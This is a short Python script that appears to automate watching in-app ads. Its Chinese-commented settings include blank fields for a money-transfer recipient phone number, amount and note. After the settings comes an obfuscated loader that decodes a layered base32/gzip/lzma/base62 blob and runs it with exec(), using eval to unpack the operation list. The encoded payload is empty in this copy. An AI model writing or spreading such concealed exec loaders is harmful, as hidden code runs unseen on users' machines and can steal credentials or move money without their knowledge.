ad_types = [5, 4, 3, 2, 1] # 要处理的广告type列表
AD_WAIT_SECONDS = 10  # 广告等待时长（秒）
PROGRESS_BAR_LENGTH = 10  # 进度条总字符数
AD_COUNT_PER_TYPE = 5  # 每个type广告数量
PROGRESS_REFRESH_INTERVAL = 5  # 进度条刷新间隔（秒）
TRANSFER_PHONE = ""  # 转帐收款手机号
TRANSFER_MONEY = ""  # 转账金额
TRANSFER_DESC = ""  # 转账备注
import base64,zlib,lzma,gzip,bz2
BASE62_CHARS="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
def _base62_dec(d):
 d_s=d.decode();n=0
 for c in d_s:n=n*62+BASE62_CHARS.index(c)
 return n.to_bytes((n.bit_length()+7)//8,"big")if n else b"\x00"
def d(d,ops):
 for op in reversed(ops):
  d=zlib.decompress(d)if op=="zlib"else lzma.decompress(d)if op=="lzma"else gzip.decompress(d)if op=="gzip"else bz2.decompress(d)if op=="bz2"else base64.b64decode(d)if op=="base64"else base64.b32decode(d)if op=="base32"else _base62_dec(d)if op=="base62"else base64.b85decode(d)
 return d.decode()
e,b="","WydiejInLCAnYmFzZTMyJywgJ2d6aXAnLCAnbHptYScsICdiYXNlMzInLCAnYmFzZTYyJ10=";o=eval(base64.b64decode(b).decode())
try:exec(d(base64.b64decode(e),o))
except Exception as x:print(f"Error:{x}")
